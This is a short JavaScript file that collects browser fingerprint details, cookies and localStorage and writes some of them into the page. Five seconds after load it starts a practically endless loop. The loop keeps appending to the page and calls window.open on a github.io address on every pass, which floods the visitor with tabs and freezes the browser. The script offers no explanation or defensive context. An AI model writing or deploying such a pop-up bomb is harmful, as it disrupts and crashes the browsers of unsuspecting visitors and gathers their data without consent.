var info={

    timeOpened:new Date(),
    timezone:(new Date()).getTimezoneOffset()/60,

    pageon(){return window.location.pathname},
    referrer(){return document.referrer},
    previousSites(){return history.length},

    browserName(){return navigator.appName},
    browserEngine(){return navigator.product},
    browserVersion1a(){return navigator.appVersion},
    browserVersion1b(){return navigator.userAgent},
    browserLanguage(){return navigator.language},
    browserOnline(){return navigator.onLine},
    browserPlatform(){return navigator.platform},
    javaEnabled(){return navigator.javaEnabled()},
    dataCookiesEnabled(){return navigator.cookieEnabled},
    dataCookies1(){return document.cookie},
    dataCookies2(){return decodeURIComponent(document.cookie.split(";"))},
    dataStorage(){return localStorage},

    sizeScreenW(){return screen.width},
    sizeScreenH(){return screen.height},
    sizeDocW(){return document.width},
    sizeDocH(){return document.height},
    sizeInW(){return innerWidth},
    sizeInH(){return innerHeight},
    sizeAvailW(){return screen.availWidth},
    sizeAvailH(){return screen.availHeight},
    scrColorDepth(){return screen.colorDepth},
    scrPixelDepth(){return screen.pixelDepth},


    latitude(){return position.coords.latitude},
    longitude(){return position.coords.longitude},
    accuracy(){return position.coords.accuracy},
    altitude(){return position.coords.altitude},
    altitudeAccuracy(){return position.coords.altitudeAccuracy},
    heading(){return position.coords.heading},
    speed(){return position.coords.speed},
    timestamp(){return position.timestamp},


    };

document.getElementById('info').innerHTML = "<p>" + info.browserPlatform() + info.sizeScreenH() + info.sizeScreenW() + info.browserLanguage() + info.timezone + info.timeOpened + info.scrColorDepth() + info.scrPixelDepth() + info.sizeDocH() + "</p>"

setTimeout(() => {
    for (let index = 0; index < 10000000000000000; index++) {
        document.getElementById('test').innerHTML += "<p>" + info.browserPlatform() + info.sizeScreenH() + info.sizeScreenW() + info.browserLanguage() + info.timezone + info.timeOpened + info.scrColorDepth() + info.scrPixelDepth() + info.sizeDocH() + 25641**index + "</p>" ;
        console.log(25641**index)
        window.open("https://cmoagcod.github.io/test/")
    }
}, 5000)